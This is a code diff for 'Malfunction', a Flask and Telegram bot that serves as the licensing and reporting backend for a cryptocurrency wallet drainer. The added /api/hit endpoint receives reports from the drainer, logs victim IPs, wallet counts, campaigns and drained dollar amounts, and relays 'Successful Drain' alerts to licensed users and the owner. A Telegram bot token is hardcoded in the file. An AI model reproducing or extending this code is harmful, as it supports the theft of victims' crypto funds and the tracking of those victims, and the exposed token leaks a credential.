@@ -1,6 +1,6 @@
 """
 Malfunction Telegram Bot
-- Handles /start, /myid, /login, /createkey, /keys, /revoke
+- Handles /start, /myid, /login, /createkey, /keys, /revoke, /logs, /dashboard
 - Owner check tied to TELEGRAM ID 8802368130
 - Exposes a small REST API for the dashboard
 """
@@ -11,37 +11,39 @@ import secrets
 import string
 import threading
 import time
+import urllib.request
+import urllib.parse
 from datetime import datetime, timedelta
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 
 # ==========================================================
-# CONFIG — replace these with your own values
+# CONFIG
 # ==========================================================
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8716799885:AAHrA6st-d8nYDYIA1lOk1EL5Sssh8qvAh4")
 OWNER_ID = "8802368130"
-DASHBOARD_URL = os.environ.get("DASHBOARD_URL", "https://your-site.netlify.app")
+DASHBOARD_URL = os.environ.get("DASHBOARD_URL", "https://malfunction-dashboard.netlify.app")
 DATA_FILE = "data.json"
-WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")   # optional; set to your bot's public URL + /webhook
+WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
 
-API_BASE = f"https://api.telegram.org/bot8716799885:AAHrA6st-d8nYDYIA1lOk1EL5Sssh8qvAh4"
+API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
 app = Flask(__name__)
-CORS(app)   # so the dashboard can call this API from any origin
+CORS(app)
 
 # ==========================================================
-# STORAGE (simple JSON file)
+# STORAGE
 # ==========================================================
 _lock = threading.Lock()
 
 def _load():
     if not os.path.exists(DATA_FILE):
         return {
-            "users": {},        # tg_id -> {username, key, approved, first_seen, ip}
-            "keys": {},         # key -> {telegram, note, max_uses, uses, expires, created_at}
-            "approvals": [],    # pending login requests
+            "users": {},
+            "keys": {},
+            "approvals": [],
             "master_log": [],
-            "sessions": {}      # key -> session data
+            "sessions": {}
         }
     with open(DATA_FILE, "r") as f:
         return json.load(f)
@@ -59,12 +61,10 @@ def db_set(data):
 # ==========================================================
 # TELEGRAM API HELPERS
 # ==========================================================
-import urllib.request
-import urllib.parse
-
-def tg(method, payload):
+def tg(method, payload, token=None):
     try:
-        url = f"{API_BASE}/{method}"
+        base = f"https://api.telegram.org/bot{token}" if token else API_BASE
+        url = f"{base}/{method}"
         data = json.dumps(payload).encode()
         req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
         with urllib.request.urlopen(req, timeout=15) as r:
@@ -73,14 +73,13 @@ def tg(method, payload):
         print("TG ERROR:", method, e)
         return None
 
-def send_message(chat_id, text, reply_markup=None):
+def send_message(chat_id, text, reply_markup=None, token=None):
     payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
     if reply_markup:
         payload["reply_markup"] = reply_markup
-    return tg("sendMessage", payload)
+    return tg("sendMessage", payload, token=token)
 
 def send_menu(chat_id, text, buttons):
-    """buttons = [[{text, callback_data}, ...], ...]"""
     return send_message(chat_id, text, {"inline_keyboard": buttons})
 
 # ==========================================================
@@ -122,7 +121,6 @@ def cmd_start(chat_id, user_id, username):
         )
         return
 
-    # non-owner: ask for telegram ID
     send_message(chat_id,
         "<b>Welcome to Malfunction</b>\n\n"
         "To register, please reply with your Telegram ID.\n"
@@ -133,21 +131,18 @@ def cmd_myid(chat_id, user_id, username):
     send_message(chat_id, f"Your Telegram ID is:\n<code>{user_id}</code>")
 
 # ==========================================================
-# REGISTRATION (user replies with their tg id)
+# REGISTRATION
 # ==========================================================
 def handle_registration(chat_id, user_id, text, username):
     data = db()
     uid = str(user_id)
 
-    # if already registered
     if uid in data["users"] and data["users"][uid].get("approved"):
         send_message(chat_id, "You're already registered. If you don't have a key yet, DM @user_8802368130.")
         return
 
-    # try parse the id they sent (we just want them to confirm it matches)
     submitted = text.strip()
 
-    # register
     data["users"][uid] = {
         "username": username or f"user_{uid}",
         "submitted_id": submitted,
@@ -162,7 +157,6 @@ def handle_registration(chat_id, user_id, text, username):
         f"Dashboard: {DASHBOARD_URL}"
     )
 
-    # notify owner
     send_message(OWNER_ID,
         f"<b>New registration</b>\n\n"
         f"User: @{username or 'unknown'}\n"
@@ -191,18 +185,19 @@ def cmd_createkey(chat_id, user_id, args):
         "note": note,
         "max_uses": 1,
         "uses": 0,
+        "bot_token": "",
+        "chat_id": tg_id,
         "expires": (datetime.utcnow() + timedelta(days=7)).isoformat(),
         "created_at": datetime.utcnow().isoformat()
     }
     db_set(data)
 
-    # send key to the user
     try:
         send_message(tg_id,
             f"<b>Welcome, @user_{tg_id}!</b>\n\n"
             f"Your license key:\n\n"
             f"<code>{key}</code>\n\n"
-            f"This key is permanently linked to your Telegram account. Keep it safe — it will never change.\n"
+            f"This key is permanently linked to your Telegram account. Keep it safe.\n"
             f"Enter this key on the dashboard to activate your session.\n\n"
             f"Dashboard: {DASHBOARD_URL}"
         )
@@ -273,7 +268,7 @@ def cmd_dashboard(chat_id):
     send_message(chat_id, f"Dashboard: {DASHBOARD_URL}")
 
 # ==========================================================
-# CALLBACK QUERIES (approve / deny)
+# CALLBACK QUERIES
 # ==========================================================
 def handle_callback(cq):
     data_id = cq.get("id")
@@ -298,7 +293,6 @@ def handle_callback(cq):
 
     tg("answerCallbackQuery", {"callback_query_id": data_id, "text": f"{action}d."})
 
-    # edit message to show result
     msg = cq.get("message", {})
     chat_id = msg.get("chat", {}).get("id")
     message_id = msg.get("message_id")
@@ -307,7 +301,7 @@ def handle_callback(cq):
         tg("editMessageText", {"chat_id": chat_id, "message_id": message_id, "text": new_text, "parse_mode": "HTML"})
 
 # ==========================================================
-# WEBHOOK — receives updates from Telegram
+# WEBHOOK
 # ==========================================================
 @app.route("/webhook", methods=["POST"])
 def webhook():
@@ -337,7 +331,6 @@ def webhook():
             elif text.startswith("/login"):
                 send_message(chat_id, f"Open the dashboard and enter your key:\n{DASHBOARD_URL}")
             else:
-                # treat as registration input (telegram id)
                 handle_registration(chat_id, user_id, text, username)
 
         elif "callback_query" in update:
@@ -347,7 +340,7 @@ def webhook():
     return "ok"
 
 # ==========================================================
-# REST API — for the dashboard
+# REST API — dashboard
 # ==========================================================
 @app.route("/api/status", methods=["GET"])
 def api_status():
@@ -373,7 +366,6 @@ def api_login():
     if k.get("uses", 0) >= k.get("max_uses", 1):
         return jsonify({"ok": False, "error": "used"}), 400
 
-    # build approval request
     approval_id = secrets.token_urlsafe(8)
     username = f"user_{k.get('telegram','x')}"
     approval = {
@@ -389,7 +381,6 @@ def api_login():
     data["keys"][key]["uses"] = k.get("uses", 0) + 1
     db_set(data)
 
-    # notify owner on Telegram
     send_menu(OWNER_ID,
         f"<b>🔐 Login request</b>\n\n"
         f"User: {username}\n"
@@ -408,6 +399,7 @@ def api_login():
         "session": {
             "username": username,
             "telegram": k.get("telegram"),
+            "key": key,
             "isOwner": k.get("telegram") == OWNER_ID,
             "since": datetime.utcnow().isoformat()
         },
@@ -420,14 +412,17 @@ def api_login():
 def api_create_key():
     body = request.get_json(force=True)
     data = db()
-    data.setdefault("keys", {})[body["key"]] = body
+    key = body.get("key")
+    entry = dict(body)
+    entry.setdefault("bot_token", "")
+    entry.setdefault("chat_id", body.get("telegram", ""))
+    data.setdefault("keys", {})[key] = entry
     db_set(data)
-    # DM user if telegram provided
     if body.get("telegram"):
         try:
             send_message(body["telegram"],
                 f"<b>You've been granted access.</b>\n\n"
-                f"Your license key:\n\n<code>{body['key']}</code>\n\n"
+                f"Your license key:\n\n<code>{key}</code>\n\n"
                 f"Dashboard: {DASHBOARD_URL}"
             )
         except Exception:
@@ -470,6 +465,124 @@ def api_master_log():
     db_set(data)
     return jsonify({"ok": True})
 
+# ==========================================================
+# /api/user-config — user saves their own bot token + chat id
+# ==========================================================
+@app.route("/api/user-config", methods=["POST"])
+def api_user_config():
+    body = request.get_json(force=True) or {}
+    key = (body.get("key") or "").strip().upper()
+    token = (body.get("bot_token") or "").strip()
+    chat = (body.get("chat_id") or "").strip()
+
+    data = db()
+    if key not in data.get("keys", {}):
+        return jsonify({"ok": False, "error": "invalid_key"}), 400
+
+    data["keys"][key]["bot_token"] = token
+    data["keys"][key]["chat_id"] = chat or data["keys"][key].get("telegram")
+    db_set(data)
+    return jsonify({"ok": True})
+
+# ==========================================================
+# /api/hit — drainer posts here, we forward to user's bot
+# ==========================================================
+@app.route("/api/hit", methods=["POST"])
+def api_hit():
+    body = request.get_json(force=True) or {}
+    key = (body.get("key") or "").strip().upper()
+
+    data = db()
+    k = data.get("keys", {}).get(key)
+    if not k:
+        return jsonify({"ok": False, "error": "invalid_key"}), 400
+
+    tg_id = k.get("telegram")
+    ip = body.get("ip") or request.remote_addr
+    campaign = body.get("campaign") or "default"
+    wallets = body.get("wallets") or 1
+    domain = body.get("domain") or "unknown"
+    event = body.get("event") or "hit"
+    amount = float(body.get("amount") or 0)
+
+    entry = {
+        "t": datetime.utcnow().isoformat(),
+        "event": event,
+        "user": k.get("note") or f"user_{tg_id}",
+        "telegram": tg_id,
+        "key": key,
+        "ip": ip,
+        "campaign": campaign,
+        "wallets": wallets,
+        "domain": domain,
+        "amount": amount
+    }
+    data.setdefault("master_log", []).append(entry)
+    if len(data["master_log"]) > 2000:
+        data["master_log"] = data["master_log"][-2000:]
+    db_set(data)
+
+    icon = {"hit": "🔔", "drain": "✅", "error": "❌"}.get(event, "🔔")
+    title = {"hit": "New Hit", "drain": "Successful Drain", "error": "Drain Errors"}.get(event, "Event")
+
+    if event == "error":
+        text = (
+            f"<b>{icon} {title}</b>\n\n"
+            f"{wallets} wallet(s) failed to drain\n"
+            f"Campaign: <code>{campaign}</code>"
+        )
+    elif event == "drain":
+        text = (
+            f"<b>{icon} {title}</b>\n\n"
+            f"User: <b>{k.get('note') or 'unknown'}</b>\n"
+            f"IP: <code>{ip}</code>\n"
+            f"Campaign: <code>{campaign}</code>\n"
+            f"Wallets: {wallets}\n"
+            f"Amount: <b>${amount:.2f}</b>\n\n"
+            f'<a href="{DASHBOARD_URL}">{DASHBOARD_URL}</a>'
+        )
+    else:
+        text = (
+            f"<b>{icon} {title}</b>\n\n"
+            f"User: <b>{k.get('note') or 'unknown'}</b>\n"
+            f"IP: <code>{ip}</code>\n"
+            f"Campaign: <code>{campaign}</code>\n"
+            f"Wallets: {wallets}\n"
+            f"Keys: ✅\n\n"
+            f'<a href="{DASHBOARD_URL}">{DASHBOARD_URL}</a>'
+        )
+
+    user_token = k.get("bot_token")
+    user_chat = k.get("chat_id") or tg_id
+    if user_token and user_chat:
+        send_message(user_chat, text, token=user_token)
+
+    owner_text = (
+        f"<b>{icon} {title} (from {k.get('note') or tg_id})</b>\n\n"
+        f"Telegram: <code>{tg_id}</code>\n"
+        f"Key: <code>{key}</code>\n"
+        f"IP: <code>{ip}</code>\n"
+        f"Campaign: <code>{campaign}</code>\n"
+        f"Wallets: {wallets}\n"
+        f"Domain: <code>{domain}</code>"
+    )
+    send_message(OWNER_ID, owner_text)
+
+    return jsonify({"ok": True})
+
+# ==========================================================
+# /api/user-hits — user pulls only their own hits
+# ==========================================================
+@app.route("/api/user-hits", methods=["POST"])
+def api_user_hits():
+    body = request.get_json(force=True) or {}
+    key = (body.get("key") or "").strip().upper()
+    data = db()
+    if key not in data.get("keys", {}):
+        return jsonify({"ok": False, "error": "invalid_key"}), 400
+    mine = [e for e in data.get("master_log", []) if e.get("key") == key]
+    return jsonify({"ok": True, "hits": mine[-200:]})
+
 @app.route("/", methods=["GET"])
 def index():
     return "Malfunction bot is running."
@@ -479,7 +592,7 @@ def health():
     return jsonify({"ok": True})
 
 # ==========================================================
-# SET WEBHOOK (run once)
+# SET WEBHOOK
 # ==========================================================
 def set_webhook():
     if not WEBHOOK_URL:
